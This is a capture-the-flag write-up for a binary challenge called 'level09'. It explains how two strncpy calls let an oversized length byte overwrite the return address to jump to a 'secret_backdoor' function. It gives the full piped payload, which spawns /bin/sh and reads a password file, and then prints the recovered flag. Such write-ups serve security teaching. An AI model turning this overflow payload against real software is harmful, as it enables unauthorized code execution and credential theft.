# level09

The executable passes a shared pointer `arg1` to `set_username` and `set_msg` functions, which perform `strncpy` based on offsets of that pointer.

We'll exploit the successive copies to overwrite `rip` with the address of the function `secret_backdoor`.

## **The exploit**

The first `strncpy` writes `41` bytes, from `arg1+140` to `arg1+181`.

The second `strncpy` writes from the start of `arg1`, but the trick is it writes of bytes equal to the value of `arg1+180`, which is the `41st` and final byte we get to set in the first `strncpy`.

By playing around in GDB, we find `rip` is at an offset of `200` bytes.

Can we set the `41st` byte to `200+` ? Yes, with non-printable ascii characters, using hex directly.

After that, we should be good if we send the following inputs :

- `40 chars + "\xff"` to set the byte to `255`
- `200 chars + 0x000055555555488c` to overwrite `rip` with the address of `secret_backdoor`
- `"/bin/sh"` to feed the `fgets -> system` in `secret_backdoor`
- `"cat /home/users/end/.pass"` to print our flag

## **The flag**

We run the following command :

```
( python -c 'print("A" * 40 + "\xff")' ; python -c 'print("B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")' ; echo /bin/sh ; sleep .1 ; echo 'cat /home/users/end/.pass' ) | ./level09
```

We get override's final flag :

```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```